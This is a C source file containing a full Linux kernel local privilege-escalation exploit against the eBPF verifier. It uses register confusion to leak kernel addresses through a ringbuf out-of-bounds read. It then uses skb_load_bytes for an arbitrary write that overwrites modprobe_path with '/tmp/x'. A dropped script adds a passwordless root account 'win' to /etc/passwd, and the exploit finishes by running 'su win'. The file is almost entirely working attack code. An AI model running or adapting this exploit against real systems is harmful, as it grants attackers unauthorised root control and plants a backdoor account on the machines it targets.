#include <stdio.h>
#include <linux/bpf.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include "bpf_insns.h"
#include "bpf.h"

#define MAP_FD_REG BPF_REG_1
#define STACK_POINTER BPF_REG_10 
#define RETURN_VALUE_REG BPF_REG_0 
#define VULN BPF_REG_7
#define ARRAY_MAP_OPS_OFF 0x12202a0
#define MODPROBE_PATH_OFF 0x1b42860
#define SPRAY 8

#define CLEAR_RAX BPF_MOV64_IMM(BPF_REG_0, 0x0)
#define ERR_CHECK \
		BPF_JMP_IMM(BPF_JNE, RETURN_VALUE_REG, 0, 1), \
		BPF_EXIT_INSN()

#define create_confusion_register(map_fd, idx) \
		BPF_MOV64_REG(BPF_REG_9, BPF_REG_1), \
		BPF_LD_MAP_FD(MAP_FD_REG, map_fd), \
		BPF_MOV64_IMM(BPF_REG_2, idx), \
		BPF_STX_MEM(BPF_DW, STACK_POINTER, BPF_REG_2, -0x8), \
		BPF_MOV64_REG(BPF_REG_2, STACK_POINTER), \
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8), \
		BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), \
		ERR_CHECK, \
		BPF_LDX_MEM(BPF_DW, BPF_REG_6, RETURN_VALUE_REG, 0), \
        BPF_JMP_IMM(BPF_JLT, BPF_REG_6, 2, 2), \
        CLEAR_RAX, \
        BPF_EXIT_INSN(), \
        BPF_MOV64_IMM(VULN, 1), \
        BPF_ALU64_REG(BPF_LSH, VULN, BPF_REG_6), \
        BPF_ALU64_IMM(BPF_SUB, VULN, 1), \
        BPF_MOV64_REG(BPF_REG_8, VULN) 


void logleak(char *s, uint64_t addr){ printf("[*] %s : %#lx\n", s, addr );}

void stop(char *s) { puts(s); getchar();}

static void write_file (const char *file, const char* data, mode_t mode){
	int f = open(file, O_WRONLY | O_TRUNC | O_CREAT, mode);
	if (f < 0){ perror ("open"); exit(1);}
	if((write(f, data, strlen(data))) < 0) {perror("write"); exit(1);};
	close(f);
}

static uint64_t dump_ringbuf(void *cons, void *prod, void *data){

	__sync_synchronize();

    // Producer pos is at the start of the Producer Page
    uint64_t p_pos = *(uint64_t*)prod;
    // Consumer pos is at the start of the Consumer Page
    uint64_t c_pos = *(uint64_t*)cons;

    printf("[!] Ringbuf -> Producer: %lu, Consumer: %lu\n", p_pos, c_pos);

    if (p_pos > c_pos) {
		char *leak = (char*)data + (c_pos & 0xFFF) + 8;

		return *(unsigned long*)&leak[0x100];
		
    }

    *(uint64_t*)cons =  p_pos;

	return (unsigned long)NULL;
}

int main(int argc, char **argv){
    
	int mapfd[SPRAY];

	printf("[+] Filling kmalloc-512 with BPF_MAP_TYPE_ARRAY...\n");
	for (int i = 0; i < SPRAY; i++){
		mapfd[i] = create_array_map(0x4, 0x8, 0x3);
	}

	// int create_map(int map_type, uint32_t key_size, uint64_t value_size, uint32_t max_entr, int inner_map_fd)
	int map_fd = mapfd[0]; 

	/* setup ring buffer */
	int ringbuf_fd = create_ringbuf_map(0x1000);

	size_t pagesize = sysconf(_SC_PAGESIZE);
	void *cons = mmap(NULL, pagesize, PROT_READ | PROT_WRITE, MAP_SHARED, ringbuf_fd, 0);
	void *prod = mmap(NULL, pagesize, PROT_READ, MAP_SHARED, ringbuf_fd, pagesize);
	void *data = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, ringbuf_fd, 2 * pagesize);

	logleak("producer", (unsigned long)prod);
	logleak("data", (unsigned long)data);
	logleak("oob FD", map_fd);

	uint64_t shift = 1;
	uint64_t leak = 0;
	update_map(map_fd, 0, &shift, BPF_ANY); 

	struct bpf_insn insns[] = {
		create_confusion_register(map_fd, 0), // BPF_REG_8, VULN == [0, 1]

		BPF_LD_MAP_FD(MAP_FD_REG, ringbuf_fd), // arg1 = bpf_ringbuf_map
		BPF_MOV64_REG(BPF_REG_2, RETURN_VALUE_REG), // arg2 (from)
		BPF_ALU64_IMM(BPF_MUL, VULN, 0x108), 
		BPF_MOV64_REG(BPF_REG_3, VULN), // arg3 = 0 or 0x100 (len)
		BPF_MOV64_IMM(BPF_REG_4, 0), // arg4 flags

		BPF_EMIT_CALL(BPF_FUNC_ringbuf_output),

		CLEAR_RAX,
		BPF_EXIT_INSN()
	};

	char *msg = "AAAA";

	int prog_fd = create_prog(insns, sizeof(insns) / sizeof(struct bpf_insn));

	unsigned long kbase, modprobe_path, array_ops;

	printf("[!] Triggering OOB read...\n");
	trigger_prog(prog_fd, msg, strlen(msg));

	array_ops = dump_ringbuf(cons, prod, data);

	if (array_ops < 0xffffffff81000000){
		printf("[-] Bad leak, try again.\n");
		exit(1);
	}

	printf("[*] Leaked!\n");
	kbase = array_ops - ARRAY_MAP_OPS_OFF;
	modprobe_path = kbase + MODPROBE_PATH_OFF;
	logleak("array_ops", array_ops);
	logleak("modprobe_path", modprobe_path);
	logleak("kernel base", kbase);


	close(prog_fd);

	struct bpf_insn insns2[] = {
		create_confusion_register(map_fd, 0), // BPF_REG_8, VULN == [0, 1]

		BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),
		BPF_MOV64_IMM(BPF_REG_2, 0x0), // offset = 0 (arg2)
		BPF_STX_MEM(BPF_DW, STACK_POINTER, RETURN_VALUE_REG, -0x18),
		BPF_STX_MEM(BPF_DW, STACK_POINTER, RETURN_VALUE_REG, -0x20),
		BPF_MOV64_REG(BPF_REG_3, STACK_POINTER), // to = fp-0x20 (arg3)
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x28),
		BPF_ALU64_IMM(BPF_MUL, VULN, 0x17),
		BPF_ALU64_IMM(BPF_ADD, VULN, 1),
		BPF_MOV64_REG(BPF_REG_4, VULN), // len = 0x10 (arg4)
		BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),
        /* aaw via BPF_FUNC_skb_load_bytes */

		BPF_LDX_MEM(BPF_DW, BPF_REG_6, STACK_POINTER, -0x20),
		BPF_MOV64_IMM(BPF_REG_4, 0x706d742f),
		BPF_STX_MEM(BPF_W, BPF_REG_6, BPF_REG_4, 0),

		BPF_LDX_MEM(BPF_DW, BPF_REG_6, STACK_POINTER, -0x18),
		BPF_MOV64_IMM(BPF_REG_4, 0x782f),
		BPF_STX_MEM(BPF_W, BPF_REG_6, BPF_REG_4, 0),

		CLEAR_RAX,
		BPF_EXIT_INSN()
	};

	prog_fd = create_prog(insns2, sizeof(insns2) / sizeof(struct bpf_insn));

	char win[0x18] = {0};

	*(unsigned long*)&win[0] = 0x4141414141414141;
	*(unsigned long*)&win[0x8] = modprobe_path;
	*(unsigned long*)&win[0x10] = modprobe_path+4;

	printf("[+] Triggering AAW\n");
	trigger_prog(prog_fd, win, sizeof(win));

	const char* script = "#!/bin/sh\necho 'win::0:0:win:/:/bin/sh' >> /etc/passwd";
	write_file("/tmp/x", script, 0777);

	socket(AF_INET, SOCK_STREAM, 123);
	printf("[*] Root!\n");
	system("su win");
}
